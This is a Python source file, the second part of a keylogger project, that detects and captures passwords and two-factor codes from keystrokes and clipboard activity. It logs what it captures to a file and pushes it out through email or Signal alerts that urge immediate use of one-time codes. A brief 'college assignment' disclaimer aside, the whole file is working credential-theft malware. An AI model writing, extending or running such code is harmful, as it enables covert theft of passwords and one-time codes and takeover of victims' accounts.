"""
password_sniffer.py — PART 2: Password detection engine.

Monitors the keystroke stream produced by Part 1 and identifies credential
entry using five detection scenarios.  Captured credentials are written to
passwords_captured.txt — a SEPARATE file from the Part 1 keystroke log.

Detection scenarios
───────────────────
  Sc1  Mouse + Type + Enter   — mouse click detected before typing, then Enter
  Sc2  Tab + Type + Enter     — Tab key used to navigate to password field
  Sc3  Ctrl+C / Ctrl+V        — clipboard copy/paste correlated with Enter
  Sc4  2FA numeric code       — 4–8 digit string followed by Enter
  Sc5  Complex string         — mixed-case + digits + special chars, len ≥ 8

Confidence scoring (0–100 %)
─────────────────────────────
  Tab flow            +40 %
  Mouse click before  +20 %
  Complex string      +30 %
  Clipboard paste     +50 %
  Clipboard changed   +25 %
  2FA pattern         +35 %
  Threshold to save   ≥ 30 %

College cybersecurity assignment — run only on systems you own.
"""

import time
import threading
from collections import deque
from datetime import datetime

from pynput import keyboard
from pynput.keyboard import Key

import config
from clipboard_monitor import ClipboardMonitor
from notifier import send_notification


def _ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


# ─────────────────────────────────────────────────────────────────────────────
class PasswordDetector:
    """Processes the keystroke stream and detects credential entry patterns."""

    def __init__(self):
        self._running       = False
        self._lock          = threading.Lock()

        # Rolling event buffer — (timestamp, key_obj, key_str)
        self._buf: deque    = deque(maxlen=500)

        # Current line (chars since last Enter)
        self._line: list    = []

        # Tab-flow state
        self._last_tab_t    = None
        self._text_before_tab = ""

        # Ctrl-hold state
        self._ctrl_down     = False

        # Clipboard integration
        self._clip_monitor  = ClipboardMonitor(callback=self._on_clipboard)
        self._clip_time     = None      # time of last clipboard change
        # last_clip_content read directly from monitor

        # pynput listener (separate from Part 1 listener)
        self._listener      = None

        # Initialise output file
        self._init_file()

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    def start(self) -> None:
        self._running = True
        self._clip_monitor.start()

        # Own keyboard listener for password detection
        self._listener = keyboard.Listener(on_press=self._on_key,
                                            on_release=self._on_release)
        self._listener.daemon = True
        self._listener.start()

        print(f"[PART 2] Password sniffer running — output: {config.PASSWORDS_FILE}")
        print(f"[PART 2] Email alerts: {'ON' if config.EMAIL_ENABLED else 'OFF'}"
              f"  |  Signal alerts: {'ON' if config.SIGNAL_ENABLED else 'OFF'}")
        print("[PART 2] Watching for: Mouse+Type, Tab+Type, Ctrl+C/V, 2FA codes, complex strings")

    def stop(self) -> None:
        self._running = False
        self._clip_monitor.stop()
        if self._listener:
            self._listener.stop()

    # ── Called by main.py monkey-patch (receives Part 1 key events) ──────────

    def process_key(self, key) -> None:
        """Entry point used when Part 1 forwards its key events here."""
        if self._running:
            self._on_key(key)

    def on_mouse_event(self, ev_str: str) -> None:
        """Entry point used when Part 1 forwards its mouse events here."""
        if not self._running:
            return
        now = time.monotonic()
        with self._lock:
            self._buf.append((now, None, f"[MOUSE:{ev_str}]"))

    # ── Clipboard callback ────────────────────────────────────────────────────

    def _on_clipboard(self, source: str, content: str) -> None:
        self._clip_time = time.monotonic()
        self._log_event("CLIPBOARD_CAPTURE",
                        f"Clipboard content changed — possible credential copied",
                        content[:150])

    # ── Key processing ────────────────────────────────────────────────────────

    def _on_key(self, key) -> None:
        if not self._running:
            return

        now = time.monotonic()

        # Key string
        if hasattr(key, "char") and key.char is not None:
            ks = key.char
        else:
            ks = f"[{key.name.upper() if hasattr(key, 'name') else str(key)}]"

        with self._lock:
            self._buf.append((now, key, ks))

        # Track Ctrl
        if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
            self._ctrl_down = True
            return

        # Ctrl combos
        if self._ctrl_down and hasattr(key, "char") and key.char:
            ch = key.char.lower()
            if ch == "c":
                self._log_event("CTRL+C", "User pressed Ctrl+C — clipboard copy detected")
            elif ch == "v":
                self._handle_ctrl_v(now)
            return

        # Tab
        if key == Key.tab:
            with self._lock:
                self._last_tab_t = now
                self._text_before_tab = "".join(
                    k[2] for k in self._buf if len(k[2]) == 1
                )
            return

        # Enter → analyse the current line
        if key == Key.enter:
            line_snap = list(self._line)
            self._line.clear()
            self._analyse(line_snap, now)
            self._last_tab_t = None
            return

        # Backspace
        if key == Key.backspace:
            if self._line:
                self._line.pop()
            return

        # Regular character
        if hasattr(key, "char") and key.char:
            self._line.append(key.char)

    def _on_release(self, key) -> None:
        if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
            self._ctrl_down = False

    # ── Ctrl+V handler ────────────────────────────────────────────────────────

    def _handle_ctrl_v(self, now: float) -> None:
        clip = self._clip_monitor.last_content
        if clip and self._clip_time and (now - self._clip_time) < 5.0:
            self._log_event(
                "CTRL+V_PASTE",
                "Clipboard content pasted — possible credential paste",
                clip[:150],
            )

    # ── Core analysis — called on every Enter press ───────────────────────────

    def _analyse(self, line: list, now: float) -> None:
        text = "".join(line)
        if not text:
            return

        confidence = 0
        reasons: list[str] = []

        # ── Scenario 4: 2FA code ─────────────────────────────────────────────
        if text.isdigit() and 4 <= len(text) <= 8:
            self._capture_2fa(text, now)
            return   # handled separately

        # ── Scenario 2: Tab → type → Enter ───────────────────────────────────
        if self._last_tab_t and (now - self._last_tab_t) < config.TAB_PASSWORD_DELAY:
            confidence += 40
            reasons.append("Tab-to-password flow (Sc2)")

        # ── Scenario 1: Mouse click before typing ────────────────────────────
        if self._mouse_click_recent(now, 5.0):
            confidence += 20
            reasons.append("Mouse-click before typing (Sc1)")

        # ── Scenario 3: Clipboard paste ───────────────────────────────────────
        clip = self._clip_monitor.last_content
        if clip and self._clip_time:
            age = now - self._clip_time
            if age < config.ENTER_PASSWORD_WINDOW:
                if text in clip or clip[:len(text)] == text:
                    confidence += 50
                    reasons.append("Entered text matches clipboard (Sc3)")
                else:
                    confidence += 25
                    reasons.append("Clipboard changed recently before Enter (Sc3)")

        # ── Scenario 5: Complex string heuristic ─────────────────────────────
        if len(text) >= 6:
            classes = sum([
                any(c.isupper()  for c in text),
                any(c.islower()  for c in text),
                any(c.isdigit()  for c in text),
                any(not c.isalnum() for c in text),
            ])
            if classes >= 3 and len(text) >= 8:
                confidence += 30
                reasons.append(f"Complex string: {classes} char-classes, len={len(text)} (Sc5)")
            elif classes >= 2 and len(text) >= 6:
                confidence += 15
                reasons.append(f"Moderately complex: {classes} char-classes (Sc5)")

        if confidence >= 30 and len(text) >= 3:
            self._capture_password(text, confidence, reasons, now)

    # ── 2FA capture ───────────────────────────────────────────────────────────

    def _capture_2fa(self, code: str, now: float) -> None:
        ts = _ts()
        block = (
            f"\n{'═' * 60}\n"
            f"  [2FA CODE DETECTED — HIGH PRIORITY]\n"
            f"  Timestamp  : {ts}\n"
            f"  Code       : {code}\n"
            f"  Note       : Code expires in ~5 minutes — act immediately!\n"
            f"{'═' * 60}\n"
        )
        with open(config.PASSWORDS_FILE, "a", encoding="utf-8") as f:
            f.write(block)

        print(f"[PART 2] 2FA CODE: {code}  (HIGH PRIORITY)")
        send_notification(
            f"2FA CODE: {code}",
            f"Two-factor code captured: {code}\n"
            f"Timestamp: {ts}\n"
            f"EXPIRES IN ~5 MINUTES",
            priority="high",
        )

    # ── Password capture ──────────────────────────────────────────────────────

    def _capture_password(self, password: str, confidence: int,
                          reasons: list, now: float) -> None:
        ts        = _ts()
        flow_parts = []
        if any("Tab" in r for r in reasons):     flow_parts.append("Tab-Type-Enter")
        if any("Mouse" in r for r in reasons):   flow_parts.append("Mouse-Type-Enter")
        if any("clipboard" in r.lower() for r in reasons): flow_parts.append("Clipboard-Paste")
        if any("Complex" in r or "Moderately" in r for r in reasons):
            flow_parts.append("Heuristic")
        flow = ", ".join(flow_parts) or "Unknown"

        block = (
            f"\n{'═' * 60}\n"
            f"  *** PASSWORD CAPTURED ***\n"
            f"  Timestamp  : {ts}\n"
            f"  Password   : {password}\n"
            f"  Confidence : {confidence}%\n"
            f"  Reasons    : {'; '.join(reasons)}\n"
            f"  Flow       : {flow}\n"
            f"  Preceding  : {self._text_before_tab[:50] if self._text_before_tab else '(none)'}\n"
            f"  Clipboard  : {self._clip_monitor.last_content[:60] if self._clip_monitor.last_content else 'N/A'}\n"
            f"{'═' * 60}\n"
        )
        with open(config.PASSWORDS_FILE, "a", encoding="utf-8") as f:
            f.write(block)

        print(f"[PART 2] PASSWORD captured — confidence {confidence}% — '{password[:20]}'")
        send_notification(
            f"Password captured ({confidence}%)",
            f"Password   : {password}\n"
            f"Confidence : {confidence}%\n"
            f"Reasons    : {'; '.join(reasons)}\n"
            f"Flow       : {flow}\n"
            f"Timestamp  : {ts}",
        )

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _mouse_click_recent(self, now: float, window: float) -> bool:
        with self._lock:
            for ts, _, ks in reversed(self._buf):
                if now - ts > window:
                    break
                if "MOUSE:CLICK" in ks or "CLICK" in ks:
                    return True
        return False

    def _log_event(self, label: str, msg: str, data: str = "") -> None:
        ts = _ts()
        with open(config.PASSWORDS_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] [{label}] {msg}\n")
            if data:
                f.write(f"  DATA: {data}\n")

    def _init_file(self) -> None:
        with open(config.PASSWORDS_FILE, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write("  SENTINELKEY — PART 2: CAPTURED CREDENTIALS\n")
            f.write(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("  Separate from Part 1 keystroke log.\n")
            f.write("=" * 60 + "\n\n")
